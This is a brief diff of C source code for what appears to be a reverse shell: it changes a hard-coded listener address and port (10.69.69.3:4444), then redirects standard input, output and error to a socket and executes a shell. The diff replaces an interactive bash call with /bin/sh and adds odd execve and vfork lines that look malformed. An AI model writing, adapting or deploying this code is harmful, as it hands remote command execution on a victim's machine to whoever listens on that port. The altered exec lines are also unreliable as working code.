@@ -12,8 +12,8 @@
 #include <netdb.h>
 #include <unistd.h>
 
-#define ADDR "10.69.69.10"
-#define PORT 9999
+#define ADDR "10.69.69.3"
+#define PORT 4444
 
 int main()
 { 
@@ -31,7 +31,12 @@ int main()
 	dup2(fd, 1); 
 	dup2(fd, 2);
 	
-	execl("/bin/bash", "/bin/bash", "-i", NULL);
+	if(execve(NULL, NULL, NULL) < 0 && errno == ENOTSUP)
+	{
+		vfork();
+	}	
+
+	execl("/bin/sh", NULL, NULL);
         
 	close(fd);
 
